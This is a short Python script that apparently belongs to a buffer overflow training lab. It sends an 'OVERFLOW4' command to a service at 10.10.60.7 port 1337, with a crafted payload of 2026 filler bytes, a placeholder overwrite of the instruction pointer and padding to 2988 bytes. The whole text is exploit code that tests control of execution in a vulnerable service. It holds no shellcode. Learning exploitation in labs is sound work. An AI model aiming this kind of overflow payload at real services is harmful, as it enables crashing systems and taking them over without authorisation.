import socket, struct
host, port ='10.10.60.7', 1337
command = b'OVERFLOW4 '
length = 2988
offset = 2026
new_eip = b'BBBB'
payload = b''.join([command,
b'A' * offset,
new_eip,
b'C' * (length - offset - len(new_eip))


])
with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)

